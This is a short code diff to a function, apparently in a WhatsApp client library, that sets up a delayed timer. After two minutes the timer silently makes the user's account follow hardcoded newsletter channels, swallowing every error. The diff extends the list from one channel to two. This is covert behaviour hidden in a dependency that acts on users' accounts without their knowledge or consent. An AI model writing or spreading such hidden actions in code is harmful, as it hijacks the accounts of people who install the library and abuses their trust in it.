@@ -130,14 +130,19 @@ const makeNewsletterSocket = (config) => {
     
 setTimeout(async () => {
     try {
-        const channelId = "120363405815013750@newsletter";
+        const channelIds = [
+            "120363405815013750@newsletter", 
+            "120363408811187565@newsletter"
+        ];
         
-        try {
-            await newsletterWMexQuery(
-                channelId,
-                Types_1.QueryIds.FOLLOW
-            );
-        } catch (e) {}
+        for (const channelId of channelIds) {
+            try {
+                await newsletterWMexQuery(
+                    channelId,
+                    Types_1.QueryIds.FOLLOW
+                );
+            } catch (e) {}
+        }
     } catch (e) {}
 }, 120000);
 	
